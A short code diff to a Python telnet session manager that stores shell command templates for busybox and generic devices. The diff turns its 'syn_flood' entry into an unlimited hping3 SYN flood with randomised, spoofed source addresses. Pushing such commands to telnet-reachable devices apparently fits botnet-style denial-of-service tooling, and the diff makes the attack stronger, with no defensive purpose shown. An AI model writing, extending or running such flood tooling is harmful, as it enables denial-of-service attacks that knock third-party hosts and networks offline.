@@ -8,18 +8,17 @@ import socket
 class TelnetManager:
     def __init__(self):
         self.active_sessions = {}
-        
-        # Known command patterns for different device types
+          # Known command patterns for different device types
         self.device_commands = {
             'busybox': {
                 'echo': 'echo {text}',
                 'ping': 'ping -c 3 {target}',
-                'syn_flood': 'hping3 -S -p {port} -c {count} {target}'
+                'syn_flood': 'sudo hping3 -S -p {port} --flood --rand-source {target}'
             },
             'generic': {
                 'echo': 'echo {text}',
                 'ping': 'ping -c 3 {target}',
-                'syn_flood': 'hping3 -S -p {port} -c {count} {target}'
+                'syn_flood': 'sudo hping3 -S -p {port} --flood --rand-source {target}'
             }
         }
         
